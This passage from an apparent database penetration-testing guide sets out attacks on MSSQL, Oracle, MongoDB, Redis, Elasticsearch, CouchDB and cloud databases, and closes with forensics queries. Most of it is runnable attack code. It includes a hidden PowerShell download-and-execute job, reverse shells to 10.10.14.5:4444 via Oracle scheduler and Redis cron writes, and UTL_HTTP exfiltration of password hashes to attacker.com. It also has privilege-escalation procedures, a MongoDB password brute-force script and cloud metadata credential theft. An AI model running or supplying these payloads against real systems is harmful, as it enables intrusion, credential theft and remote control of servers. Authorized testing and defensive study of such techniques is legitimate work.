EXEC sp_add_jobstep
  @job_name = N'MaintenanceTask',
  @step_name = N'Step1',
  @subsystem = N'CmdExec',
  @command = N'powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString(''http://10.10.14.5/payload.ps1'')"';

EXEC sp_add_jobschedule
  @job_name = N'MaintenanceTask',
  @name = N'EveryMinute',
  @freq_type = 4,        -- Daily
  @freq_interval = 1,
  @freq_subday_type = 4,  -- Minutes
  @freq_subday_interval = 1;

EXEC sp_add_jobserver
  @job_name = N'MaintenanceTask',
  @server_name = N'(LOCAL)';

-- Verify
EXEC sp_help_job @job_name = N'MaintenanceTask';

-- Clean up after engagement
EXEC sp_delete_job @job_name = N'MaintenanceTask';
```

### 4.6 TRUSTWORTHY Database Exploitation

```sql
-- Check which databases have TRUSTWORTHY enabled
SELECT name, is_trustworthy_on FROM sys.databases WHERE is_trustworthy_on = 1;

-- If we are db_owner of a TRUSTWORTHY database owned by sa:
-- We can escalate to sysadmin

-- Check database owner
SELECT db.name, sp.name AS owner
FROM sys.databases db
JOIN sys.server_principals sp ON db.owner_sid = sp.sid
WHERE db.is_trustworthy_on = 1;

-- Create a stored procedure that adds our user to sysadmin
USE [TrustworthyDB];
CREATE PROCEDURE sp_escalate
WITH EXECUTE AS OWNER
AS
  EXEC sp_addsrvrolemember 'attacker_user', 'sysadmin';
GO

EXEC sp_escalate;
-- attacker_user is now sysadmin
```

### 4.7 IMPERSONATE Privilege Escalation

```sql
-- Check who we can impersonate
SELECT DISTINCT b.name
FROM sys.server_permissions a
JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id
WHERE a.permission_name = 'IMPERSONATE';

-- Database-level impersonation
SELECT DISTINCT b.name
FROM sys.database_permissions a
JOIN sys.database_principals b ON a.grantor_principal_id = b.principal_id
WHERE a.permission_name = 'IMPERSONATE';

-- Impersonate sa
EXECUTE AS LOGIN = 'sa';
SELECT SYSTEM_USER;    -- sa
SELECT IS_SRVROLEMEMBER('sysadmin');  -- 1

-- Now do anything as sa
EXEC xp_cmdshell 'whoami';

-- Revert to original context
REVERT;
```

### 4.8 PowerUpSQL Toolkit

PowerUpSQL is the definitive toolkit for MSSQL privilege escalation and exploitation.

```powershell
# Import the module
Import-Module .\PowerUpSQL.psd1

# Discovery: Find SQL Server instances on the network
Get-SQLInstanceDomain             # Via Active Directory SPNs
Get-SQLInstanceBroadcast          # Via UDP broadcast
Get-SQLInstanceScanUDP -ComputerName 10.10.10.0/24

# Authentication testing
Get-SQLServerLoginDefaultPw       # Test default passwords
Invoke-SQLAuditDefaultLoginPw     # Comprehensive default login audit

# Information gathering
Get-SQLServerInfo -Instance "10.10.10.50"
Get-SQLDatabase -Instance "10.10.10.50"
Get-SQLTable -Instance "10.10.10.50" -DatabaseName "master"
Get-SQLColumn -Instance "10.10.10.50" -DatabaseName "production" -TableName "users"

# Find sensitive data
Get-SQLColumnSampleDataThreaded -Instance "10.10.10.50" \
  -Keywords "password,credit,ssn,secret" -SampleSize 5

# Privilege escalation
Invoke-SQLEscalatePriv -Instance "10.10.10.50"  # Automated escalation
Invoke-SQLAuditPrivImpersonateLogin -Instance "10.10.10.50"
Invoke-SQLAuditPrivTrustworthy -Instance "10.10.10.50"
Invoke-SQLAuditPrivDbChaining -Instance "10.10.10.50"

# Command execution
Invoke-SQLOSCmd -Instance "10.10.10.50" -Command "whoami" -RawResults
Invoke-SQLOSCmdCLR -Instance "10.10.10.50" -Command "whoami"
Invoke-SQLOSCmdOle -Instance "10.10.10.50" -Command "whoami"
Invoke-SQLOSCmdAgentJob -Instance "10.10.10.50" -Command "whoami"

# Linked server crawling
Get-SQLServerLinkCrawl -Instance "10.10.10.50"
Get-SQLServerLinkCrawl -Instance "10.10.10.50" -Query "EXEC xp_cmdshell 'whoami'"
```

---

## 5. Oracle Database Penetration Testing

### 5.1 TNS Listener Exploitation

The Oracle TNS (Transparent Network Substrate) listener is the gateway to Oracle databases.

```bash
# TNS listener version detection
tnscmd10g version -h 10.10.10.50 -p 1521

# TNS listener status (may reveal SIDs, service names, OS info)
tnscmd10g status -h 10.10.10.50 -p 1521

# Enumerate SIDs
# Method 1: Using tnscmd10g
tnscmd10g services -h 10.10.10.50 -p 1521

# Method 2: Using odat
odat sidguesser -s 10.10.10.50 -p 1521

# Method 3: Using Metasploit
use auxiliary/scanner/oracle/sid_enum
set RHOSTS 10.10.10.50
run

use auxiliary/scanner/oracle/sid_brute
set RHOSTS 10.10.10.50
run

# Method 4: Using Nmap scripts
nmap -sV -p 1521 --script oracle-sid-brute 10.10.10.50
nmap -sV -p 1521 --script oracle-tns-version 10.10.10.50
```

### 5.2 Default Accounts and SIDs

**Common Oracle SIDs:**

| SID | Purpose |
|-----|---------|
| ORCL | Default database |
| XE | Express Edition |
| PROD | Production (common custom) |
| DEV | Development |
| TEST | Testing |
| DB11G | 11g default |

**Default Oracle accounts (with default passwords):**

```bash
# Use odat to test default credentials
odat passwordguesser -s 10.10.10.50 -p 1521 -d ORCL \
  --accounts-file /usr/share/odat/accounts/accounts.txt

# Common defaults:
# SYS / change_on_install (SYSDBA)
# SYSTEM / manager
# SCOTT / tiger
# HR / hr
# DBSNMP / dbsnmp
# CTXSYS / ctxsys
# MDSYS / mdsys
# OUTLN / outln
# XDB / change_on_install
```

### 5.3 PL/SQL Injection

```sql
-- Classic PL/SQL injection in a vulnerable procedure
-- If a procedure constructs dynamic SQL:
CREATE OR REPLACE PROCEDURE vulnerable_proc(p_name VARCHAR2) AS
  v_sql VARCHAR2(1000);
BEGIN
  v_sql := 'SELECT * FROM users WHERE name = ''' || p_name || '''';
  EXECUTE IMMEDIATE v_sql;
END;

-- Injection payload:
EXEC vulnerable_proc('x'' UNION SELECT username, password FROM dba_users--');

-- Cursor injection for multi-statement execution:
EXEC vulnerable_proc('x''; EXECUTE IMMEDIATE ''GRANT DBA TO PUBLIC'';--');

-- Lateral SQL injection via DBMS_ASSERT bypass
-- Some versions of DBMS_ASSERT.ENQUOTE_LITERAL are bypassable:
EXEC vulnerable_proc(DBMS_ASSERT.ENQUOTE_LITERAL('x'' OR 1=1--'));
```

### 5.4 Java Stored Procedure Exploitation

Oracle includes a Java Virtual Machine (JVM) inside the database, enabling code execution:

```sql
-- Check if Java is available
SELECT * FROM v$option WHERE parameter = 'Java';

-- Create a Java class for OS command execution
CREATE OR REPLACE AND RESOLVE JAVA SOURCE NAMED "OSCommand" AS
import java.io.*;
public class OSCommand {
    public static String execCmd(String cmd) throws Exception {
        Runtime rt = Runtime.getRuntime();
        Process proc = rt.exec(new String[]{"/bin/bash", "-c", cmd});
        BufferedReader br = new BufferedReader(
            new InputStreamReader(proc.getInputStream()));
        StringBuilder sb = new StringBuilder();
        String line;
        while ((line = br.readLine()) != null) {
            sb.append(line).append("\n");
        }
        return sb.toString();
    }
};
/

-- Create a PL/SQL wrapper
CREATE OR REPLACE FUNCTION os_cmd(p_cmd VARCHAR2) RETURN VARCHAR2
AS LANGUAGE JAVA
NAME 'OSCommand.execCmd(java.lang.String) return java.lang.String';
/

-- Grant necessary Java permissions (requires DBA)
EXEC DBMS_JAVA.GRANT_PERMISSION('SCOTT', 'SYS:java.io.FilePermission', '<<ALL FILES>>', 'execute');
EXEC DBMS_JAVA.GRANT_PERMISSION('SCOTT', 'SYS:java.lang.RuntimePermission', 'writeFileDescriptor', '');
EXEC DBMS_JAVA.GRANT_PERMISSION('SCOTT', 'SYS:java.lang.RuntimePermission', 'readFileDescriptor', '');

-- Execute
SELECT os_cmd('id') FROM dual;
SELECT os_cmd('cat /etc/passwd') FROM dual;
```

### 5.5 DBMS_SCHEDULER for Command Execution

```sql
-- Create a job that executes an OS command (requires CREATE JOB privilege)
BEGIN
  DBMS_SCHEDULER.CREATE_JOB(
    job_name        => 'PWN_JOB',
    job_type        => 'EXECUTABLE',
    job_action      => '/bin/bash',
    number_of_arguments => 2,
    enabled         => FALSE
  );
  DBMS_SCHEDULER.SET_JOB_ARGUMENT_VALUE('PWN_JOB', 1, '-c');
  DBMS_SCHEDULER.SET_JOB_ARGUMENT_VALUE('PWN_JOB', 2,
    'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1');
  DBMS_SCHEDULER.ENABLE('PWN_JOB');
END;
/

-- Check job status
SELECT job_name, status, actual_start_date FROM dba_scheduler_job_run_details
WHERE job_name = 'PWN_JOB';

-- Alternative: external script execution
BEGIN
  DBMS_SCHEDULER.CREATE_JOB(
    job_name   => 'READ_SHADOW',
    job_type   => 'EXECUTABLE',
    job_action => '/bin/cat',
    number_of_arguments => 1,
    enabled    => FALSE
  );
  DBMS_SCHEDULER.SET_JOB_ARGUMENT_VALUE('READ_SHADOW', 1, '/etc/shadow');
  DBMS_SCHEDULER.ENABLE('READ_SHADOW');
END;
/

-- Output is captured in job logs
SELECT output FROM dba_scheduler_job_run_details
WHERE job_name = 'READ_SHADOW';
```

### 5.6 Privilege Escalation Through DBA Roles

```sql
-- Enumerate current privileges
SELECT * FROM session_privs;
SELECT * FROM user_role_privs;
SELECT * FROM user_sys_privs;

-- Check for dangerous privileges
SELECT grantee, privilege FROM dba_sys_privs
WHERE privilege IN (
  'CREATE ANY PROCEDURE','EXECUTE ANY PROCEDURE',
  'CREATE ANY TRIGGER','ALTER SYSTEM',
  'GRANT ANY PRIVILEGE','GRANT ANY ROLE',
  'CREATE LIBRARY','CREATE ANY DIRECTORY',
  'ALTER ANY ROLE','DROP ANY ROLE'
);

-- CREATE ANY PROCEDURE escalation:
-- If we have CREATE ANY PROCEDURE, we can create a procedure
-- in the SYS schema that runs as SYS
CREATE OR REPLACE PROCEDURE SYS.pwn_proc
AUTHID CURRENT_USER AS
PRAGMA AUTONOMOUS_TRANSACTION;
BEGIN
  EXECUTE IMMEDIATE 'GRANT DBA TO attacker';
  COMMIT;
END;
/
EXEC SYS.pwn_proc;

-- EXECUTE ANY PROCEDURE escalation:
-- Execute SYS-owned procedures that grant privileges
EXEC SYS.DBMS_METADATA.SET_TRANSFORM_PARAM(
  DBMS_METADATA.SESSION_TRANSFORM, 'SQLTERMINATOR', TRUE);
```

### 5.7 UTL_HTTP and UTL_FILE

```sql
-- SSRF via UTL_HTTP (requires EXECUTE on UTL_HTTP)
SELECT UTL_HTTP.REQUEST('http://169.254.169.254/latest/meta-data/iam/security-credentials/')
FROM dual;

-- Exfiltrate data via HTTP
DECLARE
  req  UTL_HTTP.REQ;
  resp UTL_HTTP.RESP;
  data VARCHAR2(4000);
BEGIN
  SELECT password INTO data FROM dba_users WHERE username = 'SYS';
  req := UTL_HTTP.BEGIN_REQUEST('http://attacker.com/exfil?data=' || data);
  resp := UTL_HTTP.GET_RESPONSE(req);
  UTL_HTTP.END_RESPONSE(resp);
END;
/

-- Read files via UTL_FILE
-- Requires a DIRECTORY object pointing to the target path
CREATE OR REPLACE DIRECTORY pwn_dir AS '/etc';
-- (Requires CREATE ANY DIRECTORY privilege)

DECLARE
  fh  UTL_FILE.FILE_TYPE;
  buf VARCHAR2(32767);
BEGIN
  fh := UTL_FILE.FOPEN('PWN_DIR', 'passwd', 'R', 32767);
  UTL_FILE.GET_LINE(fh, buf);
  DBMS_OUTPUT.PUT_LINE(buf);
  UTL_FILE.FCLOSE(fh);
END;
/

-- Write files via UTL_FILE
DECLARE
  fh UTL_FILE.FILE_TYPE;
BEGIN
  fh := UTL_FILE.FOPEN('PWN_DIR', 'evil.sh', 'W');
  UTL_FILE.PUT_LINE(fh, '#!/bin/bash');
  UTL_FILE.PUT_LINE(fh, 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1');
  UTL_FILE.FCLOSE(fh);
END;
/
```

### 5.8 Oracle Password Cracking

```sql
-- Extract password hashes
SELECT username, password, spare4 FROM sys.user$;
-- password = DES hash (10g and earlier)
-- spare4 = SHA1 hash (11g) or SHA-512 (12c+) in format S:hash;T:hash

-- Oracle 11g hash format: S:SHA1_HASH
-- Oracle 12c+ uses PBKDF2-based hashing
```

```bash
# Crack Oracle 11g hashes
hashcat -m 112 oracle_hashes.txt /usr/share/wordlists/rockyou.txt

# Crack Oracle 10g DES hashes
hashcat -m 3100 oracle10g_hashes.txt /usr/share/wordlists/rockyou.txt

# John the Ripper
john --format=oracle11 oracle_hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

---

## 6. NoSQL Database Penetration Testing

### 6.1 MongoDB

#### Authentication Bypass and Default Configuration

MongoDB versions before 4.0 ran without authentication by default. Even in modern versions, misconfiguration is rampant.

```bash
# Check if authentication is required
mongosh --host 10.10.10.50 --eval "db.adminCommand('listDatabases')" 2>/dev/null

# If successful without credentials, auth is disabled
```

#### NoSQL Injection via JSON Operators

MongoDB queries use JSON objects, making them vulnerable to operator injection when user input is passed directly into query objects:

```javascript
// Vulnerable Node.js code:
// const user = db.collection('users').findOne({
//   username: req.body.username,
//   password: req.body.password
// });

// Attack: Bypass authentication using $gt operator
// POST body: {"username": "admin", "password": {"$gt": ""}}
// This matches any password greater than empty string (all passwords)

// Using $ne (not equal):
// POST body: {"username": "admin", "password": {"$ne": ""}}

// Using $regex for data extraction:
// POST body: {"username": "admin", "password": {"$regex": "^a"}}
// Iterate: ^a, ^b, ... ^p, ^pa, ^pb, ... to extract password char by char

// Using $where for JavaScript injection:
// POST body: {"username": "admin", "$where": "sleep(5000)"}
// Time-based injection to confirm vulnerability

// Using $where for data exfiltration:
// POST body: {"$where": "this.username == 'admin' && this.password.match(/^a/)"}
```

```python
#!/usr/bin/env python3
"""MongoDB NoSQL injection brute-force for password extraction."""

import requests
import string

URL = "http://target.com/api/login"
CHARSET = string.ascii_lowercase + string.digits + string.punctuation
known_password = ""

while True:
    found_char = False
    for c in CHARSET:
        # Escape special regex characters
        escaped = c.replace("\\", "\\\\").replace(".", "\\.")
        escaped = escaped.replace("*", "\\*").replace("+", "\\+")
        escaped = escaped.replace("?", "\\?").replace("|", "\\|")
        escaped = escaped.replace("(", "\\(").replace(")", "\\)")
        escaped = escaped.replace("[", "\\[").replace("]", "\\]")
        escaped = escaped.replace("{", "\\{").replace("}", "\\}")
        escaped = escaped.replace("^", "\\^").replace("$", "\\$")

        payload = {
            "username": "admin",
            "password": {"$regex": f"^{known_password}{escaped}"}
        }

        resp = requests.post(URL, json=payload)
        if resp.status_code == 200 and "success" in resp.text.lower():
            known_password += c
            found_char = True
            print(f"[+] Found: {known_password}")
            break

    if not found_char:
        break

print(f"[+] Password: {known_password}")
```

#### MongoDB Data Extraction

```javascript
// Enumerate all databases
show dbs

// Enumerate collections
use targetdb
show collections

// Dump all documents from a collection
db.users.find().pretty()
db.users.find().forEach(printjson)

// Export entire database
// From shell:
// mongodump --host 10.10.10.50 --db targetdb --out /tmp/dump/

// Find sensitive data patterns
db.users.find({}, {password: 1, email: 1, ssn: 1})
db.getCollectionNames().forEach(function(c) {
    var sample = db[c].findOne();
    if (sample) {
        var keys = Object.keys(sample).join(', ');
        print(c + ': ' + keys);
    }
});
```

### 6.2 Redis

Redis is an in-memory data store that often runs without authentication and has several well-known RCE paths.

#### Unauthenticated Access

```bash
# Check for unauthenticated access
redis-cli -h 10.10.10.50 INFO
redis-cli -h 10.10.10.50 CONFIG GET *

# Enumerate all keys
redis-cli -h 10.10.10.50 KEYS '*'

# Dump all data
redis-cli -h 10.10.10.50 --scan --pattern '*' | while read key; do
  echo "KEY: $key"
  redis-cli -h 10.10.10.50 GET "$key" 2>/dev/null
  redis-cli -h 10.10.10.50 HGETALL "$key" 2>/dev/null
done
```

#### SSH Key Writing for RCE

```bash
# Generate SSH key pair
ssh-keygen -t rsa -f /tmp/redis_rsa -N ""

# Prepare the key with padding (Redis adds protocol junk around values)
(echo -e "\n\n"; cat /tmp/redis_rsa.pub; echo -e "\n\n") > /tmp/redis_key.txt

# Write the key to Redis and save to authorized_keys
redis-cli -h 10.10.10.50 FLUSHALL
cat /tmp/redis_key.txt | redis-cli -h 10.10.10.50 -x SET ssh_key

redis-cli -h 10.10.10.50 CONFIG SET dir /root/.ssh/
redis-cli -h 10.10.10.50 CONFIG SET dbfilename "authorized_keys"
redis-cli -h 10.10.10.50 SAVE

# SSH into the target
ssh -i /tmp/redis_rsa root@10.10.10.50
```

#### Cron Job Injection for RCE

```bash
# Write a reverse shell cron job
redis-cli -h 10.10.10.50 CONFIG SET dir /var/spool/cron/crontabs/
redis-cli -h 10.10.10.50 CONFIG SET dbfilename root
redis-cli -h 10.10.10.50 SET pwn "\n\n*/1 * * * * bash -c 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1'\n\n"
redis-cli -h 10.10.10.50 SAVE

# Alternative: write to /etc/cron.d/
redis-cli -h 10.10.10.50 CONFIG SET dir /etc/cron.d/
redis-cli -h 10.10.10.50 CONFIG SET dbfilename pwn
redis-cli -h 10.10.10.50 SET pwn "\n\n*/1 * * * * root bash -c 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1'\n\n"
redis-cli -h 10.10.10.50 SAVE
```

#### SLAVEOF for Data Replication

```bash
# Replicate data from target to attacker-controlled Redis
# On attacker: run Redis on port 6379

# On target Redis:
redis-cli -h 10.10.10.50 SLAVEOF attacker-ip 6379

# Now all data from target replicates to attacker's Redis
# On attacker:
redis-cli KEYS '*'
```

#### MODULE LOAD for RCE (Redis 4.0+)

```bash
# Compile a malicious Redis module (e.g., RedisModulesSDK/exp)
# The module exposes system.exec command

# Load the module (requires write access to a path Redis can read)
redis-cli -h 10.10.10.50 MODULE LOAD /tmp/evil_module.so

# Execute commands via the new command
redis-cli -h 10.10.10.50 system.exec "id"
redis-cli -h 10.10.10.50 system.exec "cat /etc/passwd"
redis-cli -h 10.10.10.50 system.rev "10.10.14.5" "4444"
```

### 6.3 Elasticsearch

```bash
# Check for unauthenticated access
curl -s http://10.10.10.50:9200/

# Enumerate all indices
curl -s http://10.10.10.50:9200/_cat/indices?v

# Dump index mappings (schema)
curl -s http://10.10.10.50:9200/_mapping?pretty

# Search all documents in an index
curl -s "http://10.10.10.50:9200/users/_search?size=10000&pretty"

# Search for sensitive data patterns
curl -s "http://10.10.10.50:9200/_all/_search?q=password&size=100&pretty"
curl -s "http://10.10.10.50:9200/_all/_search?q=credit_card&size=100&pretty"

# Bulk data extraction
curl -s "http://10.10.10.50:9200/customers/_search" -H 'Content-Type: application/json' -d '{
  "size": 10000,
  "query": {"match_all": {}},
  "_source": ["name", "email", "ssn", "credit_card"]
}'

# Script injection (if scripting is enabled)
curl -s "http://10.10.10.50:9200/_search" -H 'Content-Type: application/json' -d '{
  "size": 1,
  "script_fields": {
    "cmd": {
      "script": {
        "lang": "painless",
        "source": "Runtime.getRuntime().exec(\"id\")"
      }
    }
  }
}'

# Older Elasticsearch (< 7.x) with Groovy scripting:
curl -s "http://10.10.10.50:9200/_search" -H 'Content-Type: application/json' -d '{
  "query": {"match_all": {}},
  "script_fields": {
    "cmd": {
      "script": "import java.io.*;new Scanner(Runtime.getRuntime().exec(\"id\").getInputStream()).useDelimiter(\"\\\\A\").next()"
    }
  }
}'

# Snapshot extraction — if snapshot API is exposed
curl -s "http://10.10.10.50:9200/_snapshot/_all?pretty"
```

### 6.4 CouchDB

```bash
# Check for "Admin Party" mode (no admin password required)
curl -s http://10.10.10.50:5984/

# Enumerate all databases
curl -s http://10.10.10.50:5984/_all_dbs

# Dump all documents from a database
curl -s http://10.10.10.50:5984/mydb/_all_docs?include_docs=true

# Create admin user (if Admin Party is active)
curl -s -X PUT http://10.10.10.50:5984/_config/admins/hacker -d '"password123"'

# CVE-2017-12635: CouchDB admin creation via duplicate keys
# Exploits JSON parser inconsistency
curl -s -X PUT http://10.10.10.50:5984/_users/org.couchdb.user:pwned \
  -H "Content-Type: application/json" \
  -d '{"type":"user","name":"pwned","roles":["_admin"],"roles":[],"password":"pwned"}'
```

#### Erlang View Exploitation

```bash
# CouchDB views run Erlang code on the server
# If you can create design documents with Erlang views:
curl -X PUT "http://admin:password@10.10.10.50:5984/mydb/_design/exploit" \
  -H "Content-Type: application/json" \
  -d '{
    "language": "erlang",
    "views": {
      "cmd": {
        "map": "fun({Doc}) -> Cmd = os:cmd(\"id\"), Emit = fun(Key, Value) -> ok end, Emit(<<\"result\">>, list_to_binary(Cmd)) end."
      }
    }
  }'

# Trigger the view
curl -s "http://admin:password@10.10.10.50:5984/mydb/_design/exploit/_view/cmd"
```

### 6.5 Cassandra

```bash
# Connect with default credentials
cqlsh 10.10.10.50 -u cassandra -p cassandra

# Enumerate keyspaces and tables
cqlsh> DESCRIBE KEYSPACES;
cqlsh> DESCRIBE TABLES;
cqlsh> SELECT * FROM system_auth.roles;

# JMX remote access (port 7199, often unauthenticated)
# Using nodetool (requires JMX access):
nodetool -h 10.10.10.50 -p 7199 status
nodetool -h 10.10.10.50 -p 7199 info
nodetool -h 10.10.10.50 -p 7199 cfstats

# If JMX is unauthenticated, use jconsole or exploitation tools
# to invoke MBeans for code execution
```

---

## 7. Cloud Database Security Testing

### 7.1 AWS RDS

#### Security Group Misconfiguration

```bash
# Enumerate RDS instances (requires AWS CLI access)
aws rds describe-db-instances --query \
  'DBInstances[*].[DBInstanceIdentifier,Engine,Endpoint.Address,Endpoint.Port,PubliclyAccessible]' \
  --output table

# Check security groups for overly permissive rules
aws ec2 describe-security-groups --group-ids sg-12345678 \
  --query 'SecurityGroups[*].IpPermissions[?FromPort<=`3306` && ToPort>=`3306`]'

# Find publicly accessible RDS instances
aws rds describe-db-instances --query \
  'DBInstances[?PubliclyAccessible==`true`].[DBInstanceIdentifier,Endpoint.Address]' \
  --output table
```

#### IAM Authentication Testing

```bash
# Generate IAM auth token for RDS
aws rds generate-db-auth-token \
  --hostname mydb.cluster-xxx.us-east-1.rds.amazonaws.com \
  --port 3306 \
  --region us-east-1 \
  --username iam_user

# Connect using the token
mysql -h mydb.cluster-xxx.us-east-1.rds.amazonaws.com \
  -u iam_user \
  --password="$(aws rds generate-db-auth-token ...)" \
  --ssl-ca=/tmp/rds-combined-ca-bundle.pem \
  --ssl-mode=VERIFY_IDENTITY
```

#### Snapshot Exposure

```bash
# Check for public snapshots
aws rds describe-db-snapshots --snapshot-type public \
  --query 'DBSnapshots[*].[DBSnapshotIdentifier,DBInstanceIdentifier,Engine]'

# Check for shared snapshots (cross-account)
aws rds describe-db-snapshots --snapshot-type shared

# Restore a public snapshot to extract data (in attacker's account)
aws rds restore-db-instance-from-db-snapshot \
  --db-instance-identifier stolen-snapshot-restore \
  --db-snapshot-identifier arn:aws:rds:us-east-1:123456789012:snapshot:public-snapshot-name \
  --db-instance-class db.t3.micro \
  --availability-zone us-east-1a
```

### 7.2 Azure SQL

```bash
# Enumerate Azure SQL servers
az sql server list --query '[].{Name:name, FQDN:fullyQualifiedDomainName, Admin:administratorLogin}'

# Check firewall rules
az sql server firewall-rule list --server myserver --resource-group mygroup \
  --query '[].{Name:name, StartIP:startIpAddress, EndIP:endIpAddress}'

# Look for the dangerous "Allow Azure services" rule (0.0.0.0)
az sql server firewall-rule list --server myserver --resource-group mygroup \
  --query '[?startIpAddress==`0.0.0.0`]'

# Check if AD authentication is configured (vs SQL auth)
az sql server ad-admin list --server myserver --resource-group mygroup

# Check TDE (Transparent Data Encryption)
az sql db tde show --server myserver --database mydb --resource-group mygroup
```

### 7.3 GCP Cloud SQL

```bash
# List Cloud SQL instances
gcloud sql instances list

# Check authorized networks (IP allowlists)
gcloud sql instances describe INSTANCE_NAME \
  --format='json(settings.ipConfiguration.authorizedNetworks)'

# Check if public IP is enabled
gcloud sql instances describe INSTANCE_NAME \
  --format='json(ipAddresses)'

# Check IAM database authentication
gcloud sql instances describe INSTANCE_NAME \
  --format='json(settings.databaseFlags)'
```

### 7.4 DynamoDB — IAM Policy Exploitation

```bash
# List all DynamoDB tables
aws dynamodb list-tables

# Describe a table's schema
aws dynamodb describe-table --table-name Users

# Scan entire table (data extraction)
aws dynamodb scan --table-name Users --output json > users_dump.json

# Read DynamoDB Streams (change data capture)
aws dynamodbstreams list-streams --table-name Users
aws dynamodbstreams describe-stream --stream-arn arn:aws:dynamodb:...
aws dynamodbstreams get-shard-iterator --stream-arn arn:aws:dynamodb:... \
  --shard-id shardId-000 --shard-iterator-type TRIM_HORIZON
aws dynamodbstreams get-records --shard-iterator ITERATOR_VALUE

# Check for overly permissive IAM policies
aws iam simulate-principal-policy \
  --policy-source-arn arn:aws:iam::123456789012:user/attacker \
  --action-names dynamodb:Scan dynamodb:GetItem dynamodb:PutItem \
  --resource-arns "arn:aws:dynamodb:*:123456789012:table/*"
```

### 7.5 Cosmos DB

```bash
# If you have Cosmos DB keys (from SSRF to metadata, config files, etc.):
# The primary key grants full read/write access

# Azure CLI enumeration
az cosmosdb list --query '[].{Name:name, Kind:kind, Endpoint:documentEndpoint}'
az cosmosdb keys list --name mycosmosdb --resource-group mygroup

# Check RBAC vs key-based auth
az cosmosdb show --name mycosmosdb --resource-group mygroup \
  --query 'disableLocalAuth'
# disableLocalAuth: false means key-based auth is enabled (weaker)
```

### 7.6 Cloud-Specific Attack Paths — SSRF to Metadata for DB Credentials

```bash
# AWS: SSRF to EC2 metadata for IAM role credentials
# If you have SSRF on an application connected to RDS:
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
# Returns role name, then:
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME
# Returns AccessKeyId, SecretAccessKey, Token
# These may have RDS/DynamoDB access

# AWS: IMDSv2 requires a token header
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Azure: SSRF to IMDS for managed identity tokens
curl -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://database.windows.net/"
# Returns an access token usable for Azure SQL authentication

# GCP: SSRF to metadata for access token
curl -H "Metadata-Flavor: Google" \
  "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token"
# Returns access_token usable for Cloud SQL API
```

---

## 8. Database Forensics and Evidence

### 8.1 Capturing Database State as Evidence

When a compromise is confirmed, preserving evidence in a forensically sound manner is critical.

```bash
# PostgreSQL: Full database dump with timestamp
pg_dump -h target -U postgres -Fc --file="evidence_$(date -u +%Y%m%dT%H%M%SZ).dump" dbname
sha256sum "evidence_*.dump" > evidence_checksums.txt

# MySQL: Consistent snapshot
mysqldump --single-transaction --routines --triggers --events \
  -h target -u root -p --all-databases > "evidence_$(date -u +%Y%m%dT%H%M%SZ).sql"

# MSSQL: Backup to file
BACKUP DATABASE [TargetDB] TO DISK = N'C:\Evidence\targetdb_evidence.bak'
WITH CHECKSUM, COMPRESSION;

# Verify backup integrity
RESTORE VERIFYONLY FROM DISK = N'C:\Evidence\targetdb_evidence.bak' WITH CHECKSUM;

# Always generate checksums for chain of custody
sha256sum evidence_file.dump > evidence_file.dump.sha256
```

### 8.2 Transaction Log Analysis

Transaction logs record every modification and are invaluable for forensics.

```sql
-- PostgreSQL: WAL (Write-Ahead Log) analysis
-- Use pg_waldump to decode WAL files
-- pg_waldump /var/lib/postgresql/16/main/pg_wal/000000010000000000000001

-- MSSQL: Transaction log reading
-- Use fn_dblog to read active transaction log
SELECT [Current LSN], [Operation], [Transaction Name],
       [Transaction ID], [Begin Time], [Transaction SID],
       [SPID], [Description]
FROM fn_dblog(NULL, NULL)
WHERE [Operation] IN ('LOP_BEGIN_XACT', 'LOP_COMMIT_XACT',
                       'LOP_INSERT_ROWS', 'LOP_DELETE_ROWS',
                       'LOP_MODIFY_ROW')
ORDER BY [Current LSN];

-- Find who created the backdoor account
SELECT [Current LSN], [Operation], [Transaction Name],
       [Begin Time], [Transaction SID],
       SUSER_SNAME([Transaction SID]) AS [Login]
FROM fn_dblog(NULL, NULL)
WHERE [Transaction Name] = 'CREATE LOGIN'
ORDER BY [Begin Time];

-- MySQL: Binary log analysis
-- mysqlbinlog /var/lib/mysql/binlog.000001 --start-datetime="2025-01-01 00:00:00"
```

### 8.3 Audit Log Examination

```sql
-- PostgreSQL: If pgaudit extension is installed
SELECT * FROM pg_catalog.pg_stat_activity
WHERE state = 'active' AND query LIKE '%GRANT%';

-- Check pg_log files for suspicious queries
-- grep -i "grant\|create role\|alter role\|copy.*program" /var/log/postgresql/*.log

-- MSSQL: Server Audit logs
SELECT event_time, action_id, succeeded, session_server_principal_name,
       server_principal_name, database_name, object_name, statement
FROM sys.fn_get_audit_file('/var/opt/mssql/audit/*.sqlaudit', DEFAULT, DEFAULT)
WHERE action_id IN ('LGIF', 'LGIS', 'AL', 'CR', 'DR')  -- Login, Alter, Create, Drop
ORDER BY event_time DESC;

-- Oracle: Unified Audit Trail
SELECT event_timestamp, dbusername, action_name, object_schema,
       object_name, sql_text, return_code
FROM unified_audit_trail
WHERE event_timestamp > SYSTIMESTAMP - INTERVAL '7' DAY
  AND action_name IN ('GRANT', 'CREATE USER', 'ALTER USER', 'LOGON')
ORDER BY event_timestamp DESC;
```

### 8.4 Identifying Data Exfiltration Through Query Analysis

```sql
-- PostgreSQL: Analyze pg_stat_statements for suspicious patterns
SELECT query, calls, total_exec_time, rows,
       mean_exec_time
FROM pg_stat_statements
WHERE query ILIKE '%COPY%TO%'
   OR query ILIKE '%lo_export%'
   OR query ILIKE '%pg_read_file%'
   OR query ILIKE '%dblink%'
   OR (rows > 10000 AND query ILIKE '%SELECT%')
ORDER BY total_exec_time DESC;

-- MSSQL: Check for large data exports
SELECT qs.execution_count, qs.total_rows, qs.last_execution_time,
       SUBSTRING(qt.text, 1, 200) AS query_text
FROM sys.dm_exec_query_stats qs
CROSS APPLY sys.dm_exec_sql_text(qs.sql_handle) qt
WHERE qs.total_rows > 10000
